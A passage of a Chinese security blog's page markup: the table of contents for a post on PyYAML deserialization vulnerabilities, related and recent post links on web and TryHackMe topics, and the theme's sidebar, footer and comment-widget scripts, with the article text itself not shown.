anzhiyu-icon-calendar-days fa-fw"></i> 2023-08-06</div><div class="title">docker基础</div></div></a></div><div><a href="/2023/11/12/flask-pin-ma-xue-xi/" title="Flask-PIN码学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-11-12</div><div class="title">Flask-PIN码学习</div></div></a></div><div><a href="/2024/02/27/jwt-gong-ji-xue-xi/" title="JWT攻击学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-27</div><div class="title">JWT攻击学习</div></div></a></div><div><a href="/2024/04/09/php-opcachegetshell/" title="PHP-OPcacheGetshell学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-04-09</div><div class="title">PHP-OPcacheGetshell学习</div></div></a></div><div><a href="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/" title="Phar反序列化"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-11-13</div><div class="title">Phar反序列化</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-ymal%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">0x01 YMAL简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-yaml%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">0x02 Yaml基本语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-yaml%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E7%BB%93%E6%9E%84"><span class="toc-number">3.</span> <span class="toc-text">0x03 Yaml数据类型与结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">4.</span> <span class="toc-text">0x04 反序列化漏洞成因</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pyyamllt51"><span class="toc-number">4.1.</span> <span class="toc-text">PyYaml&lt;&#x3D;5.1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#yaml-gtpython"><span class="toc-number">4.1.1.</span> <span class="toc-text">yaml-&gt;python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python-gtyaml"><span class="toc-number">4.1.2.</span> <span class="toc-text">python-&gt;yaml</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0rce"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞成因–RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pythonobject%E6%A0%87%E7%AD%BE"><span class="toc-number">4.2.1.</span> <span class="toc-text">!!python&#x2F;object标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pythonobjectapply%E6%A0%87%E7%AD%BE"><span class="toc-number">4.2.2.</span> <span class="toc-text">!!python&#x2F;object&#x2F;apply标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pythonobjectnew%E6%A0%87%E7%AD%BE"><span class="toc-number">4.2.3.</span> <span class="toc-text">!!python&#x2F;object&#x2F;new标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pythonmodule%E6%A0%87%E7%AD%BE"><span class="toc-number">4.2.4.</span> <span class="toc-text">!!python&#x2F;module标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pythonname%E6%A0%87%E7%AD%BE"><span class="toc-number">4.2.5.</span> <span class="toc-text">!!python&#x2F;name标签</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%901"><span class="toc-number">4.2.5.1.</span> <span class="toc-text">调试分析1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%902"><span class="toc-number">4.2.5.2.</span> <span class="toc-text">调试分析2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%80%BB%E7%BB%93"><span class="toc-number">4.2.6.</span> <span class="toc-text">payload总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞成因–文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pythonmodule%E6%A0%87%E7%AD%BE"><span class="toc-number">4.3.1.</span> <span class="toc-text">!!python&#x2F;module标签</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.4.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pyyamlgt51"><span class="toc-number">4.5.</span> <span class="toc-text">PyYaml&gt;5.1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">4.5.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.5.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pyyamllt51%E7%9A%84poc"><span class="toc-number">4.5.3.</span> <span class="toc-text">PyYaml&lt;&#x3D;5.1的poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#builtins%E6%A8%A1%E5%9D%97%E4%B8%AD%E7%9A%84%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="toc-number">4.5.4.</span> <span class="toc-text">builtins模块中的内置函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">4.5.4.1.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ruamelyaml%E8%AF%BB%E5%86%99yaml%E6%96%87%E4%BB%B6"><span class="toc-number">4.6.</span> <span class="toc-text">利用ruamel.yaml读写yaml文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">0x05 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
